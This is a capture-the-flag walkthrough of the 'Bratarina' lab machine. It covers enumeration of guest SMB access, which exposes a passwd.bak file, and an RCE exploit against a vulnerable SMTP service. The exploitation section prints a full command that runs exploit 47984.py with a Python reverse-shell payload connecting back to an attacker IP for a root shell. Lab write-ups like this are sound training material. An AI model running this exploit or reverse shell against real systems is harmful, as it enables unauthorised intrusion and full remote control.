Bratarina

Target IP: 192.168.170.71

Scanning


There are four TCP ports open on the target machine: SSH, SMTP, HTTP, and SMB. I will start enumeration with the SMB application on port 445.

Enumeration

Port 445: SMB

The SMB application allows guest access. There is an interesting share called backups with read-only access. This share contains the file passwd.bak.


This passwd.bak contains the username neil.

Port 25: SMTP

Looks like this application is vulnerable to RCE. If the version is less than 6.6.1, it can be used to exploit the application.

Exploitation & Privilege Escalation


Using the exploit above, I gained a root shell on the target machine by exploiting the vulnerable SMTP application. I used the command below to achieve this. Python payload was used. I also had to escape the characters to make the exploit work.
python3 47984.py 192.168.170.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.173\",25));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'

Flags


Since the exploit lands us an immediate root shell, there is only proof.txt flag on the target machine.
